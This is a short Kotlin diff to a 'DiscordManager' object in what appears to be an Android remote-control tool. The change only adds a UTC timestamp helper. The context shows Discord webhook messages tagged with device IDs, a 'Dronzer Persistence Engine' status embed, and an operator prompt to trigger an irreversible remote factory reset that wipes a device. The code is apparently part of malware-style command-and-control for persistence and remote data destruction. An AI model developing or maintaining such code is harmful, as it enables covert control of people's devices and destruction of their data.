@@ -16,6 +16,7 @@ import java.util.concurrent.TimeUnit
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import java.util.TimeZone
 
 object DiscordManager {
 
@@ -75,6 +76,12 @@ object DiscordManager {
         return " [ID:${DeviceManager.deviceId}] [$timestamp]"
     }
 
+    private fun getIsoTimestamp(): String {
+        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
+        sdf.timeZone = TimeZone.getTimeZone("UTC")
+        return sdf.format(Date())
+    }
+
     fun sendToWebhook(content: String, fileName: String? = null, raw: Boolean = false) {
         if (webhookUrl.isEmpty()) return
         scope.launch {
@@ -114,7 +121,7 @@ object DiscordManager {
                     .put("color", 0x8B0000) 
                     .put("thumbnail", JSONObject().put("url", "https://i.imgur.com/8n9S9Yp.png")) 
                     .put("footer", JSONObject().put("text", "Dronzer Persistence Engine • Active"))
-                    .put("timestamp", java.time.OffsetDateTime.now().toString())
+                    .put("timestamp", getIsoTimestamp())
 
                 val actionRow = JSONObject()
                     .put("type", 1)
@@ -150,7 +157,7 @@ object DiscordManager {
                     .put("description", "You are about to trigger a full **FACTORY RESET** on device: `$deviceModel` (ID: `${DeviceManager.deviceId}`).\n\n**THIS ACTION IS IRREVERSIBLE AND WILL WIPE ALL DATA.**\n\nAre you absolutely sure?")
                     .put("color", 0xFF0000)
                     .put("footer", JSONObject().put("text", "Dronzer Security Protocol"))
-                    .put("timestamp", java.time.OffsetDateTime.now().toString())
+                    .put("timestamp", getIsoTimestamp())
 
                 val actionRow = JSONObject()
                     .put("type", 1)
